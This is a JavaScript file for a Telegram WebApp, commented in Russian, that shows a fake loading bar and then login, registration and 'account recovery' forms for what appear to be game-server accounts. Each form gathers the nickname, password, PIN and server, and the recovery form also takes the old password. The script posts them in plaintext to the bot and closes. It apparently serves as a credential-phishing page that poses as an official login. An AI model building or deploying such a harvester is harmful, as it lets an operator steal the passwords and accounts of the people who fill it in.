const tg = window.Telegram.WebApp;
tg.expand();

// === АНИМАЦИЯ ЗАГРУЗКИ ===
let percent = 0;
const bar = document.getElementById('bar');
const percentText = document.getElementById('percent');
const loader = document.getElementById('loader');
const main = document.getElementById('main');

const interval = setInterval(() => {
    percent += 2;
    if (percent >= 100) {
        percent = 100;
        clearInterval(interval);
        setTimeout(() => {
            loader.style.display = 'none';
            main.style.display = 'block';
        }, 300);
    }
    if (bar) bar.style.width = percent + '%';
    if (percentText) percentText.textContent = percent + '%';
}, 30);

// === ФУНКЦИИ ===
function sendData(data) {
    tg.sendData(data);
    tg.close();
}

function goTo(page) { window.location.href = page; }

function validateNick(nick) { return /^[A-Za-z]+_[A-Za-z]+$/.test(nick); }

function login() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;
    if (!nick) { alert('Введите ник!'); return; }
    if (!password) { alert('Введите пароль!'); return; }
    sendData(`🔐 ВХОД\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
}

function register() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const email = document.getElementById('email').value.trim();
    const server = document.getElementById('server').value;
    const referrer = document.getElementById('referrer').value.trim();
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Nick_Name!'); return; }
    if (!password) { alert('Введите пароль!'); return; }
    sendData(`📝 РЕГИСТРАЦИЯ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`);
}

function recover() {
    const nick = document.getElementById('nick').value.trim();
    const oldPass = document.getElementById('old_password').value.trim();
    const newPass = document.getElementById('new_password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;
    if (!nick) { alert('Введите ник!'); return; }
    if (!oldPass) { alert('Введите старый пароль!'); return; }
    if (!newPass) { alert('Введите новый пароль!'); return; }
    sendData(`🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый: ${oldPass}\n🔒 Новый: ${newPass}\n🛡 ПИН: ${pin || 'нет'}\n🌍 Сервер: ${server}`);
}